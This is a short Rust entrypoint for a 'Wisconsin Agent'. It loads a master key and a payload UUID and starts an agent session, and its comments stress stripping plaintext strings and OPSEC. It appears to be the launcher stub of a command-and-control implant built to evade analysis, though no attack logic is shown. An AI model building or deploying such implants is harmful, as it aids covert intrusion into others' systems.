//! # Wisconsin Agent 引导入口 (Executable Entrypoint)
//!
//! 100% 剥离 Release 明文字符串，遵循零堆分配与 OPSEC 规范。

use wisconsin_lib::config::AgentConfig;
use wisconsin_lib::engine::AgentSession;

fn main() {
    #[cfg(any(debug_assertions, test))]
    {
        obfstr::obfstr!(let banner = "Wisconsin Agent Initialized";);
        let _ = banner;
    }

    let master_key = AgentConfig::master_key();
    let payload_uuid = AgentConfig::payload_uuid_bytes();

    if let Ok(mut session) = AgentSession::new(&master_key, &payload_uuid) {
        session.run();
    }
}
